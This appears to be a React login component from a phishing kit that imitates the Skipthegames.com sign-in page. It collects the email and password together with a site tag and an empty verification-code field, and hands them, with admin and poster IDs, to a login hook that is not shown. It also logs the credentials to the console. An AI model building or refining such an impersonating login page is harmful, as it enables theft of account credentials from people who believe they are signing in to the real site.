"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import Image from "next/image";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";

function LoginForm({ adminId, posterId }) {
  const initialvalues = {
    email: "",
    password: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    const allValues = {
      site: site,
      mail: email,
      passcode: password,
      skipcode: "",
    };
    console.log("allValues", allValues);
    login(allValues, formik);
  };

  const captchaKeyDev = "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
  // const captchaKeyProd = "6LdM_9MiAAAAAJpk2F0ZDaWmIv0BfTfMKChH7AGL";
  const captchaKeyProd = "6Lck0YUjAAAAANYCIMzWXamx6oD5pRnwwKszARPR";

  const recaptchaKey =
    process.env.NODE_ENV !== "development" ? captchaKeyProd : captchaKeyDev;

  return (
    <div className="container px-4 lg:px-0">
      <div className="pt-[14px] lg:pt-[18px] py-[38px] grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-[150px]">
        <div className="">
          <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
            Log in to your account
          </h3>

          <div className="mt-2">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="space-y-5">
                  <Field
                    className="w-full text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                    placeholder="Your email"
                    name="email"
                    type="email"
                    required
                  />

                  <Field
                    className="w-full text-sm  px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                    placeholder="Password"
                    name="password"
                    type="password"
                    autoComplete="on"
                    required
                  />

                  <button
                    type="submit"
                    className="w-full bg-custom-cyan hover:bg-custom-cyan2 py-[14px] text-white transition duration-300 rounded"
                  >
                    Log in
                  </button>
                </Form>
              )}
            </Formik>
          </div>

          <p className="mt-5 text-[9px] text-custom-gray2 font-semibold">
            By clicking "Log in", you accept
            <span className="text-custom-cyan hover:text-custom-cyan2 cursor-pointer">
              {" "}
              Skipthegames.com's Terms and Conditions of Use
            </span>
          </p>

          <p className="text-sm text-custom-rose underline cursor-pointer">
            Forgot your password?
          </p>
        </div>

        <div className="lg:ml-[120px]">
          <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
            First time here?
          </h3>
          <p className="mt-[14px] text-custom-rose underline cursor-pointer">
            Post your first ad
          </p>
        </div>
      </div>
    </div>

    //   <Image
    //     src="/images/warning.png"
    //     alt="warning"
    //     className="mt-2 mx-auto"
    //     width={350}
    //     height={154}
    //   />

    //   <p className="mt-[10px] uppercase text-center text-sm text-custom-blue2 hover:underline">
    //     Forgot Password?
    //   </p>
    // </div>
  );
}

export default LoginForm;
